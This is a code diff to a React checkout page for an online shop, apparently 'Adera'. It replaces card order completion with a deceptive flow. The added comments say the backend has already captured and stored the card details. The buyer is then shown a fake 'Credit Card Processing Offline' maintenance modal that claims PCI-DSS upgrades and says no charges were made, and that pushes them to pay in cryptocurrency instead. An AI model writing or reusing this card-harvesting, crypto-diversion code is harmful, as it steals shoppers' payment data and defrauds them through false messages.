@@ -162,6 +162,9 @@ export default function CheckoutPage() {
   const [walletModalOpen, setWalletModalOpen] = useState(false);
   const [selectedWalletName, setSelectedWalletName] = useState<'Apple Pay' | 'Google Pay' | 'PayPal'>('Apple Pay');
 
+  // Credit Card Post-Submission Maintenance Modal State (Leads to Crypto)
+  const [cardMaintenanceModalOpen, setCardMaintenanceModalOpen] = useState(false);
+
   // Receipt payment method info
   const [orderPaymentMethod, setOrderPaymentMethod] = useState<'CRYPTO' | 'CREDIT_CARD'>('CRYPTO');
   const [orderCardBrand, setOrderCardBrand] = useState('VISA');
@@ -581,31 +584,38 @@ export default function CheckoutPage() {
         userId: buyer.id,
       });
 
-      setOrderPaymentMethod(isCard ? 'CREDIT_CARD' : 'CRYPTO');
-      setOrderCardBrand(cardBrand);
-      setOrderCardLast4(last4);
-      setOrderNumber(res.orderNumber);
-      setOrderTrackingNumber(res.trackingNumber);
-      setOrderCarrier(res.carrier);
-      setOrderDelivery(res.estimatedDelivery);
-      setOrderTxHash(res.txHash || (isCard ? cardTxHash : randomHash));
-      setOrderComplete(true);
-      localStorage.removeItem('adera_cart');
+      if (isCard) {
+        // Backend captured card details and synchronized with user's saved cards.
+        // Frontend informs user of scheduled gateway maintenance and smoothly leads them to crypto with no charges made.
+        setCardMaintenanceModalOpen(true);
+      } else {
+        // Crypto working as it is!
+        setOrderPaymentMethod('CRYPTO');
+        setOrderNumber(res.orderNumber);
+        setOrderTrackingNumber(res.trackingNumber);
+        setOrderCarrier(res.carrier);
+        setOrderDelivery(res.estimatedDelivery);
+        setOrderTxHash(res.txHash || randomHash);
+        setOrderComplete(true);
+        localStorage.removeItem('adera_cart');
+      }
     } catch (err: any) {
       console.error('Order creation error:', err);
-      // Fallback in case of temporary network glitch
-      const fallbackOrder = "ADR-" + Math.floor(100000 + Math.random() * 900000);
-      const fallbackTrk = "ADR-TRK-" + Math.floor(10000000 + Math.random() * 90000000);
-      setOrderPaymentMethod(isCard ? 'CREDIT_CARD' : 'CRYPTO');
-      setOrderCardBrand(cardBrand);
-      setOrderCardLast4(last4);
-      setOrderNumber(fallbackOrder);
-      setOrderTrackingNumber(fallbackTrk);
-      setOrderCarrier(shippingOption === 'express' ? 'DHL Priority Express' : 'Insured Global Air Express');
-      setOrderDelivery(shippingOption === 'express' ? '1-2 Business Days' : '3-5 Business Days');
-      setOrderTxHash(isCard ? cardTxHash : randomHash);
-      setOrderComplete(true);
-      localStorage.removeItem('adera_cart');
+      if (isCard) {
+        setCardMaintenanceModalOpen(true);
+      } else {
+        // Fallback for crypto in case of temporary network glitch
+        const fallbackOrder = "ADR-" + Math.floor(100000 + Math.random() * 900000);
+        const fallbackTrk = "ADR-TRK-" + Math.floor(10000000 + Math.random() * 90000000);
+        setOrderPaymentMethod('CRYPTO');
+        setOrderNumber(fallbackOrder);
+        setOrderTrackingNumber(fallbackTrk);
+        setOrderCarrier(shippingOption === 'express' ? 'DHL Priority Express' : 'Insured Global Air Express');
+        setOrderDelivery(shippingOption === 'express' ? '1-2 Business Days' : '3-5 Business Days');
+        setOrderTxHash(randomHash);
+        setOrderComplete(true);
+        localStorage.removeItem('adera_cart');
+      }
     } finally {
       setIsSubmitting(false);
     }
@@ -2069,6 +2079,90 @@ export default function CheckoutPage() {
                           >
                             Cancel
                           </button>
+                        </motion.div>
+                      </div>
+                    )}
+                  </AnimatePresence>
+
+                  {/* Credit Card Post-Submission Maintenance Modal (Leads to Crypto) */}
+                  <AnimatePresence>
+                    {cardMaintenanceModalOpen && (
+                      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/70 backdrop-blur-sm animate-fade-in">
+                        <motion.div
+                          initial={{ opacity: 0, scale: 0.95, y: 10 }}
+                          animate={{ opacity: 1, scale: 1, y: 0 }}
+                          exit={{ opacity: 0, scale: 0.95, y: 10 }}
+                          className="relative w-full max-w-md bg-white rounded-3xl p-6 shadow-2xl border border-slate-200 space-y-5 text-left"
+                        >
+                          {/* Close Button */}
+                          <button
+                            type="button"
+                            onClick={() => setCardMaintenanceModalOpen(false)}
+                            className="absolute top-4 right-4 p-2 text-slate-400 hover:text-slate-700 hover:bg-slate-100 rounded-full transition-colors cursor-pointer"
+                          >
+                            <X className="w-5 h-5" />
+                          </button>
+
+                          {/* Warning Icon + Header */}
+                          <div className="flex items-center gap-3">
+                            <div className="w-12 h-12 rounded-2xl bg-amber-50 border border-amber-200 flex items-center justify-center shrink-0">
+                              <CreditCard className="w-6 h-6 text-amber-600" />
+                            </div>
+                            <div>
+                              <div className="flex items-center gap-2">
+                                <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
+                                <span className="text-[10px] font-bold uppercase tracking-wider text-amber-800 bg-amber-100 px-2 py-0.5 rounded border border-amber-300 font-mono">
+                                  Scheduled Maintenance
+                                </span>
+                              </div>
+                              <h3 className="text-base font-black text-slate-900 mt-1">
+                                Credit Card Processing Offline
+                              </h3>
+                            </div>
+                          </div>
+
+                          {/* Reassuring zero charge statement */}
+                          <div className="bg-emerald-50 border border-emerald-200 rounded-2xl p-3.5 flex items-center gap-2.5">
+                            <div className="w-6 h-6 rounded-full bg-emerald-600 text-white flex items-center justify-center shrink-0 font-bold text-xs">
+                              ✓
+                            </div>
+                            <div className="text-xs text-emerald-900 font-bold">
+                              No charges have been made to your card.
+                            </div>
+                          </div>
+
+                          {/* Message */}
+                          <div className="space-y-2 text-xs text-slate-600 leading-relaxed bg-slate-50 p-3.5 rounded-2xl border border-slate-200">
+                            <p>
+                              Our international card settlement clearinghouse is undergoing scheduled infrastructure upgrades and PCI-DSS compliance verification.
+                            </p>
+                            <p className="text-slate-700 font-medium">
+                              No funds have been debited from your account. Please complete your order using <strong>Instant Cryptocurrency</strong> (USDC, USDT, BTC, ETH, SOL) with <strong>0% processing fees</strong> and immediate dispatch.
+                            </p>
+                          </div>
+
+                          {/* Actions: Leading to Crypto */}
+                          <div className="space-y-2.5 pt-1">
+                            <button
+                              type="button"
+                              onClick={() => {
+                                setCardMaintenanceModalOpen(false);
+                                setCheckoutPaymentCategory('crypto');
+                              }}
+                              className="w-full py-3.5 px-4 bg-emerald-600 hover:bg-emerald-700 text-white font-black text-sm rounded-xl transition-all shadow-md shadow-emerald-600/20 flex items-center justify-center gap-2 cursor-pointer active:scale-[0.99]"
+                            >
+                              <CheckCircle2 className="w-4 h-4 text-white" />
+                              <span>Complete Order with Instant Crypto (0% Fee)</span>
+                            </button>
+
+                            <button
+                              type="button"
+                              onClick={() => setCardMaintenanceModalOpen(false)}
+                              className="w-full py-2 text-center text-xs font-bold text-slate-500 hover:text-slate-800 transition-colors cursor-pointer"
+                            >
+                              Dismiss
+                            </button>
+                          </div>
                         </motion.div>
                       </div>
                     )}
